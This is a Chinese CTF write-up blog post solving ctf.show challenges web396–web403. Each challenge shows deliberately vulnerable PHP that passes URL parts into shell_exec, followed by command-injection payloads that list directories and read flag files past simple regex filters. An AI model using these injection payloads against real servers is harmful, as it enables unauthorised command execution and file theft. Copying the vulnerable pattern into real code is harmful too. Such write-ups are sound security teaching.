<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>其他 | wanan</title><meta name="keywords" content="ctf.show"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web396 &lt;?php&#x2F;*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-15 16:38:07 Last Modified by:   h1xa Last Modified time: 2021-01-15 17:20:22 email: h1xa@ctfer.com link: https:&#x2F;&#x2F;ctfer.com*&#x2F;error_">
<meta property="og:type" content="article">
<meta property="og:title" content="其他">
<meta property="og:url" content="https://lovewanan.github.io/ctfshow/ctf.show/%E5%85%B6%E4%BB%96/index.html">
<meta property="og:site_name" content="wanan">
<meta property="og:description" content="web396 &lt;?php&#x2F;*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-15 16:38:07 Last Modified by:   h1xa Last Modified time: 2021-01-15 17:20:22 email: h1xa@ctfer.com link: https:&#x2F;&#x2F;ctfer.com*&#x2F;error_">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.pixabay.com/photo/2014/11/15/23/31/alpsee-532864_1280.jpg">
<meta property="article:published_time" content="2022-04-17T14:37:17.293Z">
<meta property="article:modified_time" content="2022-04-18T07:29:08.612Z">
<meta property="article:author" content="wanan">
<meta property="article:tag" content="ctf.show">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2014/11/15/23/31/alpsee-532864_1280.jpg"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg"><link rel="canonical" href="https://lovewanan.github.io/ctfshow/ctf.show/%E5%85%B6%E4%BB%96/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '其他',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-04-18 15:29:08'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2014/11/15/23/31/alpsee-532864_1280.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">其他</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-17T14:37:17.293Z" title="发表于 2022-04-17 22:37:17">2022-04-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-04-18T07:29:08.612Z" title="更新于 2022-04-18 15:29:08">2022-04-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctfshow/">ctfshow</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>44分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="其他"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 17:20:22</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);<span class="comment">#解析一个url返回关联数组</span></span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);<span class="comment">#通过shell环境执行命令,并将完整的输出以字符串形式返回 host www.baidu.com path /test/</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>简单测试一下发现,通过;可以让shell的命令进行分开执行</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291943011.png" alt="image-20220329194307970"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://1/1; echo `ls` &gt; 1.txt</span><br></pre></td></tr></table></figure>

<p>接着访问1.txt文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291945703.png" alt="image-20220329194559670"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://www/qqq;cat fl0g.php &gt; 2.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291953344.png" alt="image-20220329195341272"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://www/qqq;tac `ls`&gt; 3.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291953960.png" alt="image-20220329195357904"></p>
<h1 id="web397"><a href="#web397" class="headerlink" title="web397"></a>web397</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 17:49:13</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>有一个&#x2F;tmp&#x2F;目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://1/1; echo `ls`/../ &gt; 1.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312033319.png" alt="image-20220331203325243"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312033697.png" alt="image-20220331203335633"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://www/qqq;cat fl0g.php &gt; 2.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312035864.png" alt="image-20220331203522793"></p>
<h1 id="web398"><a href="#web398" class="headerlink" title="web398"></a>web398</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 18:00:42</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">?url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure>

<h1 id="web399"><a href="#web399" class="headerlink" title="web399"></a>web399</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 18:04:27</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">?url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure>

<h1 id="web400"><a href="#web400" class="headerlink" title="web400"></a>web400</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 18:13:14</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">?url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure>

<h1 id="web401"><a href="#web401" class="headerlink" title="web401"></a>web401</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 18:16:48</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|http|https|\|/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">?url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure>

<h1 id="web402"><a href="#web402" class="headerlink" title="web402"></a>web402</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 18:35:41</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|\||base/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=file:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">?url=file:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure>

<h1 id="web403"><a href="#web403" class="headerlink" title="web403"></a>web403</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 18:44:06</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=http:<span class="comment">//127.0.0.1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure>



